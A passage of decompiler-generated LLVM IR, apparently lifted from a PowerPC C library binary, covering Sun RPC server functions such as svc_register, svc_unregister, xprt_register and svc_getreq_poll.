dec_label_pc_10010bc8:                            ; preds = %dec_label_pc_10010bc0, %dec_label_pc_10010bc8
  %v1_10010bec16 = phi i32 [ %v1_10010bec, %dec_label_pc_10010bc8 ], [ %v1_10010bec15, %dec_label_pc_10010bc0 ]
  store i32 268504012, i32* @lr, align 4
  %v1_10010bc8 = call i32 @svc_getreq_common(i32 %v1_10010bec16)
  %v0_10010bcc = load i32, i32* @r30, align 4
  %v1_10010bcc = add i32 %v0_10010bcc, -1
  %v2_10010bd4 = urem i32 %v1_10010bcc, 64
  %v3_10010bd4 = shl i32 1, %v2_10010bd4
  %v0_10010bd8 = load i32, i32* @r31, align 4
  %v2_10010bd8 = xor i32 %v3_10010bd4, %v0_10010bd8
  store i32 %v2_10010bd8, i32* @r31, align 4
  %v1_10010be0 = call i32 @ffs(i32 %v2_10010bd8)
  %v3_10010be4 = icmp eq i32 %v1_10010be0, 0
  %v0_10010be8 = load i32, i32* @r28, align 4
  %v2_10010be8 = add i32 %v1_10010be0, -1
  %v1_10010bec = add i32 %v2_10010be8, %v0_10010be8
  br i1 %v3_10010be4, label %dec_label_pc_10010bf4, label %dec_label_pc_10010bc8

dec_label_pc_10010bf4:                            ; preds = %dec_label_pc_10010bc8, %dec_label_pc_10010bc0
  %v0_10010be8.lcssa = phi i32 [ %v0_10010be813, %dec_label_pc_10010bc0 ], [ %v0_10010be8, %dec_label_pc_10010bc8 ]
  %v1_10010bec.lcssa = phi i32 [ %v1_10010bec15, %dec_label_pc_10010bc0 ], [ %v1_10010bec, %dec_label_pc_10010bc8 ]
  %v0_10010bf4 = load i32, i32* @r29, align 4
  %v1_10010bf4 = add i32 %v0_10010bf4, 4
  store i32 %v1_10010bf4, i32* @r29, align 4
  %v1_10010bf8 = add i32 %v0_10010be8.lcssa, 32
  store i32 %v1_10010bf8, i32* @r28, align 4
  %v1_10010bfc = load i32, i32* @r27, align 4
  %v2_10010bfc = icmp slt i32 %v1_10010bf8, %v1_10010bfc
  br i1 %v2_10010bfc, label %dec_label_pc_10010bc0, label %dec_label_pc_10010c04

dec_label_pc_10010c04:                            ; preds = %dec_label_pc_10010bf4, %entry
  %v0_10010c14 = phi i32 [ %v0_10010bb0, %entry ], [ %v1_10010bec.lcssa, %dec_label_pc_10010bf4 ]
  ret i32 %v0_10010c14

; uselistorder directives
  uselistorder i32 %v1_10010bf8, { 1, 0 }
  uselistorder i32 %v1_10010bf4, { 1, 0 }
  uselistorder i32 %v2_10010bd8, { 1, 0 }
  uselistorder i32 (i32)* @ffs, { 1, 0 }
  uselistorder label %dec_label_pc_10010bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10010bc0, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 %arg1, i32* %r11.global-to-local, align 4
  %v2_10010c28 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_10010c28, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r10, align 4
  store i32 0, i32* %stack_var_-136, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  store i32 31, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge

dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge: ; preds = %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge.dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge_crit_edge, %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge.lr.ph
  %v1_10010c40.pre = phi i32 [ %v2_10010c28, %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge.lr.ph ], [ %v1_10010c40.pre.pre, %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge.dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge_crit_edge ]
  %v0_10010c40.pre = phi i32 [ 0, %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge.lr.ph ], [ %v0_10010c40.pre.pre, %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge.dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge_crit_edge ]
  %v1_10010c4422 = phi i32 [ 4, %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge.lr.ph ], [ %v1_10010c44, %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge.dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge_crit_edge ]
  %v3_10010c40 = add i32 %v1_10010c40.pre, %v1_10010c4422
  %v4_10010c40 = inttoptr i32 %v3_10010c40 to i32*
  store i32 %v0_10010c40.pre, i32* %v4_10010c40, align 4
  %v0_10010c44 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010c48 = add i32 %v0_10010c44, 1
  store i32 %v1_10010c48, i32* %r9.global-to-local, align 4
  %v0_10010c4c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010c4c = add i32 %v0_10010c4c, -1
  store i32 %v1_10010c4c, i32* %ctr.global-to-local, align 4
  %v2_10010c4c = icmp eq i32 %v1_10010c4c, 0
  br i1 %v2_10010c4c, label %dec_label_pc_10010c50, label %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge.dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge_crit_edge

dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge.dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge_crit_edge: ; preds = %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge
  %v1_10010c44 = mul i32 %v0_10010c44, 4
  %v0_10010c40.pre.pre = load i32, i32* @r10, align 4
  %v1_10010c40.pre.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge

dec_label_pc_10010c50:                            ; preds = %dec_label_pc_10010c40.dec_label_pc_10010c40_crit_edge
  %phitmp23 = inttoptr i32 %v1_10010c48 to i32*
  %v0_10010c50.pre.pre = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10010c50.pre.pre, i32* %stack_var_-136, align 4
  store i32 268504152, i32* @lr, align 4
  %v2_10010c54 = call i32 @svc_getreqset(i32* %phitmp23)
  store i32 %v2_10010c54, i32* %r3.global-to-local, align 4
  ret i32 %v2_10010c54

; uselistorder directives
  uselistorder i32 %v1_10010c4c, { 1, 0 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_10010c70 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10010c70, i32* @r5, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268504200, i32* @lr, align 4
  %v1_10010c84 = call i32 @svc_find(i32 %v2_10010c70)
  store i32 %v1_10010c84, i32* @r31, align 4
  %v3_10010c88 = icmp eq i32 %v1_10010c84, 0
  br i1 %v3_10010c88, label %dec_label_pc_10010ccc, label %dec_label_pc_10010c90

dec_label_pc_10010c90:                            ; preds = %entry
  %v3_10010c90 = load i32, i32* %stack_var_-40, align 4
  %v1_10010c94 = inttoptr i32 %v1_10010c84 to i32*
  %v2_10010c94 = load i32, i32* %v1_10010c94, align 4
  store i32 %v2_10010c94, i32* @r30, align 4
  %v3_10010c98 = icmp eq i32 %v3_10010c90, 0
  br i1 %v3_10010c98, label %dec_label_pc_10010ca0, label %dec_label_pc_10010cac

dec_label_pc_10010ca0:                            ; preds = %dec_label_pc_10010c90
  store i32 268504228, i32* @lr, align 4
  %v0_10010ca0 = call i32 @__rpc_thread_variables()
  %v0_10010ca4 = load i32, i32* @r30, align 4
  %v2_10010ca4 = add i32 %v0_10010ca0, 184
  %v3_10010ca4 = inttoptr i32 %v2_10010ca4 to i32*
  store i32 %v0_10010ca4, i32* %v3_10010ca4, align 4
  br label %dec_label_pc_10010cb0

dec_label_pc_10010cac:                            ; preds = %dec_label_pc_10010c90
  %v2_10010cac = inttoptr i32 %v3_10010c90 to i32*
  store i32 %v2_10010c94, i32* %v2_10010cac, align 4
  br label %dec_label_pc_10010cb0

dec_label_pc_10010cb0:                            ; preds = %dec_label_pc_10010ca0, %dec_label_pc_10010cac
  %v0_10010cb4 = load i32, i32* @r31, align 4
  store i32 %v0_10010cb4, i32* @r3, align 4
  %v2_10010cb8 = inttoptr i32 %v0_10010cb4 to i32*
  store i32 0, i32* %v2_10010cb8, align 4
  store i32 268504256, i32* @lr, align 4
  %v0_10010cbc = call i32 @free()
  %v0_10010cc0 = load i32, i32* @r29, align 4
  %v0_10010cc4 = load i32, i32* @r28, align 4
  store i32 268504268, i32* @lr, align 4
  %v2_10010cc8 = call i32 @__GI_pmap_unset(i32 %v0_10010cc0, i32 %v0_10010cc4)
  br label %dec_label_pc_10010ccc

dec_label_pc_10010ccc:                            ; preds = %entry, %dec_label_pc_10010cb0
  %v0_10010cdc = phi i32 [ 0, %entry ], [ %v2_10010cc8, %dec_label_pc_10010cb0 ]
  ret i32 %v0_10010cdc

; uselistorder directives
  uselistorder label %dec_label_pc_10010ccc, { 1, 0 }
  uselistorder label %dec_label_pc_10010cb0, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268504320, i32* @lr, align 4
  %v0_10010cfc1 = call i32 @__rpc_thread_variables()
  %v1_10010d002 = add i32 %v0_10010cfc1, 184
  %v2_10010d003 = inttoptr i32 %v1_10010d002 to i32*
  %v3_10010d004 = load i32, i32* %v2_10010d003, align 4
  %v3_10010d047 = icmp eq i32 %v3_10010d004, 0
  br i1 %v3_10010d047, label %dec_label_pc_10010d0c, label %dec_label_pc_10010cf0

dec_label_pc_10010cf0:                            ; preds = %entry, %dec_label_pc_10010cf0
  %v3_10010d008 = phi i32 [ %v3_10010d00, %dec_label_pc_10010cf0 ], [ %v3_10010d004, %entry ]
  %v1_10010cf0 = add i32 %v3_10010d008, 8
  %v2_10010cf0 = inttoptr i32 %v1_10010cf0 to i32*
  %v3_10010cf0 = load i32, i32* %v2_10010cf0, align 4
  %v1_10010cf4 = add i32 %v3_10010d008, 4
  %v2_10010cf4 = inttoptr i32 %v1_10010cf4 to i32*
  %v3_10010cf4 = load i32, i32* %v2_10010cf4, align 4
  store i32 268504316, i32* @lr, align 4
  %v3_10010cf8 = call i32 @svc_unregister(i32 %v3_10010cf4, i32 %v3_10010cf0, i32 %v3_10010d008)
  store i32 268504320, i32* @lr, align 4
  %v0_10010cfc = call i32 @__rpc_thread_variables()
  %v1_10010d00 = add i32 %v0_10010cfc, 184
  %v2_10010d00 = inttoptr i32 %v1_10010d00 to i32*
  %v3_10010d00 = load i32, i32* %v2_10010d00, align 4
  %v3_10010d04 = icmp eq i32 %v3_10010d00, 0
  br i1 %v3_10010d04, label %dec_label_pc_10010d0c, label %dec_label_pc_10010cf0

dec_label_pc_10010d0c:                            ; preds = %dec_label_pc_10010cf0, %entry
  %v0_10010cfc.lcssa = phi i32 [ %v0_10010cfc1, %entry ], [ %v0_10010cfc, %dec_label_pc_10010cf0 ]
  ret i32 %v0_10010cfc.lcssa

; uselistorder directives
  uselistorder i32 %v3_10010d00, { 1, 0 }
  uselistorder i32 %v3_10010d008, { 2, 0, 1 }
  uselistorder i32 268504320, { 1, 0 }
  uselistorder label %dec_label_pc_10010cf0, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r26, align 4
  %v2_10010d38 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10010d38, i32* @r5, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* @r27, align 4
  store i32 268504400, i32* @lr, align 4
  %v3_10010d4c = call i32 @svc_find(i32 %arg2)
  %v3_10010d50 = icmp eq i32 %v3_10010d4c, 0
  store i32 16, i32* @r3, align 4
  br i1 %v3_10010d50, label %dec_label_pc_10010d6c, label %dec_label_pc_10010d5c

dec_label_pc_10010d5c:                            ; preds = %entry
  %v1_10010d5c = add i32 %v3_10010d4c, 12
  %v2_10010d5c = inttoptr i32 %v1_10010d5c to i32*
  %v3_10010d5c = load i32, i32* %v2_10010d5c, align 4
  %v1_10010d60 = load i32, i32* @r28, align 4
  %v4_10010d60 = icmp eq i32 %v3_10010d5c, %v1_10010d60
  br i1 %v4_10010d60, label %dec_label_pc_10010d94, label %dec_label_pc_10010dbc

dec_label_pc_10010d6c:                            ; preds = %entry
  store i32 268504432, i32* @lr, align 4
  %v0_10010d6c = call i32 @malloc()
  store i32 %v0_10010d6c, i32* @r31, align 4
  %v3_10010d70 = icmp eq i32 %v0_10010d6c, 0
  br i1 %v3_10010d70, label %dec_label_pc_10010dbc, label %dec_label_pc_10010d78

dec_label_pc_10010d78:                            ; preds = %dec_label_pc_10010d6c
  %v0_10010d78 = load i32, i32* @r28, align 4
  %v2_10010d78 = add i32 %v0_10010d6c, 12
  %v3_10010d78 = inttoptr i32 %v2_10010d78 to i32*
  store i32 %v0_10010d78, i32* %v3_10010d78, align 4
  %v0_10010d7c = load i32, i32* @r30, align 4
  %v1_10010d7c = load i32, i32* @r31, align 4
  %v2_10010d7c = add i32 %v1_10010d7c, 4
  %v3_10010d7c = inttoptr i32 %v2_10010d7c to i32*
  store i32 %v0_10010d7c, i32* %v3_10010d7c, align 4
  %v0_10010d80 = load i32, i32* @r29, align 4
  %v1_10010d80 = load i32, i32* @r31, align 4
  %v2_10010d80 = add i32 %v1_10010d80, 8
  %v3_10010d80 = inttoptr i32 %v2_10010d80 to i32*
  store i32 %v0_10010d80, i32* %v3_10010d80, align 4
  store i32 268504456, i32* @lr, align 4
  %v0_10010d84 = call i32 @__rpc_thread_variables()
  %v1_10010d88 = add i32 %v0_10010d84, 184
  %v2_10010d88 = inttoptr i32 %v1_10010d88 to i32*
  %v3_10010d88 = load i32, i32* %v2_10010d88, align 4
  %v1_10010d8c = load i32, i32* @r31, align 4
  %v2_10010d8c = inttoptr i32 %v1_10010d8c to i32*
  store i32 %v3_10010d88, i32* %v2_10010d8c, align 4
  %v0_10010d90 = load i32, i32* @r31, align 4
  store i32 %v0_10010d90, i32* %v2_10010d88, align 4
  br label %dec_label_pc_10010d94

dec_label_pc_10010d94:                            ; preds = %dec_label_pc_10010d5c, %dec_label_pc_10010d78
  %v0_10010d94 = load i32, i32* @r27, align 4
  %v3_10010d94 = icmp eq i32 %v0_10010d94, 0
  br i1 %v3_10010d94, label %dec_label_pc_10010dc0, label %dec_label_pc_10010dac

dec_label_pc_10010dac:                            ; preds = %dec_label_pc_10010d94
  %v0_10010d9c = load i32, i32* @r29, align 4
  %v0_10010d98 = load i32, i32* @r30, align 4
  %v0_10010dac = load i32, i32* @r26, align 4
  %v1_10010dac = add i32 %v0_10010dac, 4
  %v2_10010dac = inttoptr i32 %v1_10010dac to i16*
  %v3_10010dac = load i16, i16* %v2_10010dac, align 2
  %v4_10010dac = zext i16 %v3_10010dac to i32
  store i32 268504500, i32* @lr, align 4
  %v4_10010db0 = call i32 @pmap_set(i32 %v0_10010d98, i32 %v0_10010d9c, i32 %v0_10010d94, i32 %v4_10010dac)
  br label %dec_label_pc_10010dc0

dec_label_pc_10010dbc:                            ; preds = %dec_label_pc_10010d5c, %dec_label_pc_10010d6c
  br label %dec_label_pc_10010dc0

dec_label_pc_10010dc0:                            ; preds = %dec_label_pc_10010d94, %dec_label_pc_10010dac, %dec_label_pc_10010dbc
  %v0_10010dc0 = phi i32 [ 1, %dec_label_pc_10010d94 ], [ %v4_10010db0, %dec_label_pc_10010dac ], [ 0, %dec_label_pc_10010dbc ]
  ret i32 %v0_10010dc0

; uselistorder directives
  uselistorder i32 184, { 1, 5, 0, 3, 2, 4 }
  uselistorder i32 (i32)* @svc_find, { 1, 0 }
  uselistorder label %dec_label_pc_10010dc0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10010d94, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  %v2_10010dec = load i32, i32* %arg1, align 4
  store i32 %v2_10010dec, i32* @r31, align 4
  store i32 268504564, i32* @lr, align 4
  %v0_10010df0 = call i32 @_rpc_dtablesize()
  store i32 %v0_10010df0, i32* %r3.global-to-local, align 4
  %v2_10010df4 = icmp slt i32 %v2_10010dec, %v0_10010df0
  br i1 %v2_10010df4, label %dec_label_pc_10010dfc, label %dec_label_pc_10010e80

dec_label_pc_10010dfc:                            ; preds = %entry
  store i32 268504576, i32* @lr, align 4
  %v0_10010dfc = call i32 @__rpc_thread_variables()
  store i32 %v0_10010dfc, i32* %r3.global-to-local, align 4
  %v1_10010e00 = mul i32 %v2_10010dec, 4
  %v1_10010e04 = add i32 %v0_10010dfc, 180
  %v2_10010e04 = inttoptr i32 %v1_10010e04 to i32*
  %v3_10010e04 = load i32, i32* %v2_10010e04, align 4
  %v2_10010e08 = add i32 %v3_10010e04, %v1_10010e00
  %v3_10010e08 = inttoptr i32 %v2_10010e08 to i32*
  %v4_10010e08 = load i32, i32* %v3_10010e08, align 4
  %v1_10010e0c = load i32, i32* @r30, align 4
  %v4_10010e0c = icmp eq i32 %v4_10010e08, %v1_10010e0c
  br i1 %v4_10010e0c, label %dec_label_pc_10010e14, label %dec_label_pc_10010e80

dec_label_pc_10010e14:                            ; preds = %dec_label_pc_10010dfc
  %v2_10010e14 = icmp sgt i32 %v2_10010dec, 1023
  store i32 0, i32* %v3_10010e08, align 4
  br i1 %v2_10010e14, label %dec_label_pc_10010e44, label %dec_label_pc_10010e24

dec_label_pc_10010e24:                            ; preds = %dec_label_pc_10010e14
  store i32 268504616, i32* @lr, align 4
  %v0_10010e24 = load i32, i32* %r3.global-to-local, align 4
  %v2_10010e24 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_10010e24, i32 %v1_10010e00)
  store i32 %v2_10010e24, i32* %r3.global-to-local, align 4
  %v1_10010e28 = call i32 @__asm_rlwinm(i32 %v2_10010dec, i32 29, i32 3, i32 29)
  store i32 %v1_10010e28, i32* @r10, align 4
  %v2_10010e2c = add i32 %v1_10010e28, %v2_10010e24
  %v3_10010e2c = inttoptr i32 %v2_10010e2c to i32*
  %v4_10010e2c = load i32, i32* %v3_10010e2c, align 4
  %v1_10010e30 = urem i32 %v2_10010dec, 32
  %v3_10010e38 = shl i32 -2, %v1_10010e30
  %v4_10010e38 = sub nsw i32 32, %v1_10010e30
  %v5_10010e38 = lshr i32 -2, %v4_10010e38
  %v6_10010e38 = or i32 %v5_10010e38, %v3_10010e38
  %v2_10010e3c = and i32 %v4_10010e2c, %v6_10010e38
  store i32 %v2_10010e3c, i32* %v3_10010e2c, align 4
  br label %dec_label_pc_10010e44

dec_label_pc_10010e44:                            ; preds = %dec_label_pc_10010e14, %dec_label_pc_10010e24
  store i32 0, i32* @r30, align 4
  store i32 268504692, i32* @lr, align 4
  %v0_10010e701 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10010e701, i32* %r3.global-to-local, align 4
  %v1_10010e742 = inttoptr i32 %v0_10010e701 to i32*
  %v2_10010e743 = load i32, i32* %v1_10010e742, align 4
  %v0_10010e784 = load i32, i32* @r30, align 4
  %v2_10010e785 = icmp slt i32 %v0_10010e784, %v2_10010e743
  br i1 %v2_10010e785, label %dec_label_pc_10010e4c, label %dec_label_pc_10010e80

dec_label_pc_10010e4c:                            ; preds = %dec_label_pc_10010e44, %dec_label_pc_10010e70.backedge
  store i32 268504656, i32* @lr, align 4
  %v0_10010e4c = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10010e4c, i32* %r3.global-to-local, align 4
  %v0_10010e50 = load i32, i32* @r30, align 4
  %v1_10010e50 = mul i32 %v0_10010e50, 8
  %v1_10010e54 = inttoptr i32 %v0_10010e4c to i32*
  %v2_10010e54 = load i32, i32* %v1_10010e54, align 4
  store i32 %v2_10010e54, i32* %r3.global-to-local, align 4
  %v1_10010e58 = add i32 %v0_10010e50, 1
  store i32 %v1_10010e58, i32* @r30, align 4
  %v2_10010e5c = add i32 %v2_10010e54, %v1_10010e50
  %v3_10010e5c = inttoptr i32 %v2_10010e5c to i32*
  %v4_10010e5c = load i32, i32* %v3_10010e5c, align 4
  %v4_10010e60 = icmp eq i32 %v4_10010e5c, %v2_10010dec
  br i1 %v4_10010e60, label %dec_label_pc_10010e68, label %dec_label_pc_10010e70.backedge

dec_label_pc_10010e68:                            ; preds = %dec_label_pc_10010e4c
  store i32 -1, i32* %v3_10010e5c, align 4
  br label %dec_label_pc_10010e70.backedge

dec_label_pc_10010e70.backedge:                   ; preds = %dec_label_pc_10010e68, %dec_label_pc_10010e4c
  store i32 268504692, i32* @lr, align 4
  %v0_10010e70 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10010e70, i32* %r3.global-to-local, align 4
  %v1_10010e74 = inttoptr i32 %v0_10010e70 to i32*
  %v2_10010e74 = load i32, i32* %v1_10010e74, align 4
  %v0_10010e78 = load i32, i32* @r30, align 4
  %v2_10010e78 = icmp slt i32 %v0_10010e78, %v2_10010e74
  br i1 %v2_10010e78, label %dec_label_pc_10010e4c, label %dec_label_pc_10010e80

dec_label_pc_10010e80:                            ; preds = %dec_label_pc_10010e70.backedge, %dec_label_pc_10010e44, %dec_label_pc_10010dfc, %entry
  %v0_10010e90 = phi i32 [ %v0_10010dfc, %dec_label_pc_10010dfc ], [ %v0_10010df0, %entry ], [ %v0_10010e701, %dec_label_pc_10010e44 ], [ %v0_10010e70, %dec_label_pc_10010e70.backedge ]
  ret i32 %v0_10010e90

; uselistorder directives
  uselistorder i32 %v0_10010e50, { 1, 0 }
  uselistorder i32 %v2_10010dec, { 4, 0, 2, 3, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 8, 4, 5, 6, 7, 0 }
  uselistorder i32 268504692, { 1, 0 }
  uselistorder label %dec_label_pc_10010e4c, { 1, 0 }
  uselistorder label %dec_label_pc_10010e44, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r27, align 4
  store i32 0, i32* @r30, align 4
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10010f00

dec_label_pc_10010eb8:                            ; preds = %dec_label_pc_10010f00
  %v3_10010eb8 = inttoptr i32 %v2_10010f10 to i32*
  %v4_10010eb8 = load i32, i32* %v3_10010eb8, align 4
  store i32 %v4_10010eb8, i32* @r31, align 4
  %v3_10010ebc = icmp eq i32 %v4_10010eb8, -1
  br i1 %v3_10010ebc, label %dec_label_pc_10010efc, label %dec_label_pc_10010ec4

dec_label_pc_10010ec4:                            ; preds = %dec_label_pc_10010eb8
  %v1_10010ec4 = add i32 %v2_10010f10, 6
  %v2_10010ec4 = inttoptr i32 %v1_10010ec4 to i16*
  %v3_10010ec4 = load i16, i16* %v2_10010ec4, align 2
  %v3_10010ec8 = icmp eq i16 %v3_10010ec4, 0
  br i1 %v3_10010ec8, label %dec_label_pc_10010efc, label %dec_label_pc_10010ed4

dec_label_pc_10010ed4:                            ; preds = %dec_label_pc_10010ec4
  %v1_10010ecc = and i16 %v3_10010ec4, 32
  %v3_10010ecc = icmp eq i16 %v1_10010ecc, 0
  %v1_10010ed8 = add i32 %v0_10010f0c, 1
  store i32 %v1_10010ed8, i32* @r29, align 4
  br i1 %v3_10010ecc, label %dec_label_pc_10010ef8, label %dec_label_pc_10010ee0

dec_label_pc_10010ee0:                            ; preds = %dec_label_pc_10010ed4
  store i32 268504804, i32* @lr, align 4
  %v0_10010ee0 = call i32 @__rpc_thread_variables()
  %v0_10010ee4 = load i32, i32* @r31, align 4
  %v1_10010ee4 = mul i32 %v0_10010ee4, 4
  %v1_10010ee8 = add i32 %v0_10010ee0, 180
  %v2_10010ee8 = inttoptr i32 %v1_10010ee8 to i32*
  %v3_10010ee8 = load i32, i32* %v2_10010ee8, align 4
  %v2_10010eec = add i32 %v3_10010ee8, %v1_10010ee4
  %v3_10010eec = inttoptr i32 %v2_10010eec to i32*
  %v4_10010eec = load i32, i32* %v3_10010eec, align 4
  store i32 ptrtoint (i32* @global_var_10010ef4.411 to i32), i32* @lr, align 4
  %v2_10010ef0 = inttoptr i32 %v4_10010eec to i32*
  %v3_10010ef0 = call i32 @xprt_unregister(i32* %v2_10010ef0, i32 %v3_10010ee8)
  br label %dec_label_pc_10010efc

dec_label_pc_10010ef8:                            ; preds = %dec_label_pc_10010ed4
  store i32 268504828, i32* @lr, align 4
  %v1_10010ef8 = call i32 @svc_getreq_common(i32 %v4_10010eb8)
  br label %dec_label_pc_10010efc

dec_label_pc_10010efc:                            ; preds = %dec_label_pc_10010ec4, %dec_label_pc_10010eb8, %dec_label_pc_10010ee0, %dec_label_pc_10010ef8
  %v0_10010efc = load i32, i32* @r30, align 4
  %v1_10010efc = add i32 %v0_10010efc, 1
  store i32 %v1_10010efc, i32* @r30, align 4
  br label %dec_label_pc_10010f00

dec_label_pc_10010f00:                            ; preds = %entry, %dec_label_pc_10010efc
  store i32 268504836, i32* @lr, align 4
  %v0_10010f00 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_10010f04 = load i32, i32* @r30, align 4
  %v1_10010f04 = mul i32 %v0_10010f04, 8
  %v1_10010f08 = inttoptr i32 %v0_10010f00 to i32*
  %v2_10010f08 = load i32, i32* %v1_10010f08, align 4
  %v0_10010f0c = load i32, i32* @r29, align 4
  %v1_10010f0c = load i32, i32* @r27, align 4
  %v2_10010f0c = icmp slt i32 %v0_10010f0c, %v1_10010f0c
  %v0_10010f10 = load i32, i32* @r28, align 4
  %v2_10010f10 = add i32 %v0_10010f10, %v1_10010f04
  %v2_10010f14 = icmp slt i32 %v0_10010f04, %v2_10010f08
  %brmerge.demorgan = and i1 %v2_10010f14, %v2_10010f0c
  br i1 %brmerge.demorgan, label %dec_label_pc_10010eb8, label %dec_label_pc_10010f20

dec_label_pc_10010f20:                            ; preds = %dec_label_pc_10010f00
  ret i32 %v0_10010f00

; uselistorder directives
  uselistorder i32 %v2_10010f10, { 1, 0 }
  uselistorder i32 %v0_10010f0c, { 1, 0 }
  uselistorder i32 %v0_10010f04, { 1, 0 }
  uselistorder i32 %v3_10010ee8, { 1, 0 }
  uselistorder label %dec_label_pc_10010f00, { 1, 0 }
  uselistorder label %dec_label_pc_10010efc, { 3, 2, 0, 1 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268504908, i32* @lr, align 4
  %v0_10010f48 = call i32 @__rpc_thread_variables()
  store i32 %v0_10010f48, i32* %r3.global-to-local, align 4
  %v1_10010f4c = add i32 %v0_10010f48, 180
  %v2_10010f4c = inttoptr i32 %v1_10010f4c to i32*
  %v3_10010f4c = load i32, i32* %v2_10010f4c, align 4
  store i32 %v0_10010f48, i32* @r31, align 4
  %v0_10010f54 = load i32, i32* @r30, align 4
  %v1_10010f54 = inttoptr i32 %v0_10010f54 to i32*
  %v2_10010f54 = load i32, i32* %v1_10010f54, align 4
  %v3_10010f58 = icmp eq i32 %v3_10010f4c, 0
  br i1 %v3_10010f58, label %dec_label_pc_10010f60, label %dec_label_pc_10010f78

dec_label_pc_10010f60:                            ; preds = %entry
  store i32 268504932, i32* @lr, align 4
  %v0_10010f60 = call i32 @_rpc_dtablesize()
  %v1_10010f64 = mul i32 %v0_10010f60, 4
  store i32 %v1_10010f64, i32* @r3, align 4
  store i32 268504940, i32* @lr, align 4
  %v0_10010f68 = call i32 @malloc()
  store i32 %v0_10010f68, i32* %r3.global-to-local, align 4
  %v3_10010f6c = icmp eq i32 %v0_10010f68, 0
  %v1_10010f70 = load i32, i32* @r31, align 4
  %v2_10010f70 = add i32 %v1_10010f70, 180
  %v3_10010f70 = inttoptr i32 %v2_10010f70 to i32*
  store i32 %v0_10010f68, i32* %v3_10010f70, align 4
  br i1 %v3_10010f6c, label %dec_label_pc_1001105c, label %dec_label_pc_10010f78

dec_label_pc_10010f78:                            ; preds = %entry, %dec_label_pc_10010f60
  store i32 268504956, i32* @lr, align 4
  %v0_10010f78 = call i32 @_rpc_dtablesize()
  store i32 %v0_10010f78, i32* %r3.global-to-local, align 4
  %v2_10010f7c = icmp slt i32 %v2_10010f54, %v0_10010f78
  br i1 %v2_10010f7c, label %dec_label_pc_10010f84, label %dec_label_pc_1001105c

dec_label_pc_10010f84:                            ; preds = %dec_label_pc_10010f78
  %v2_10010f84 = icmp sgt i32 %v2_10010f54, 1023
  %v0_10010f88 = load i32, i32* @r31, align 4
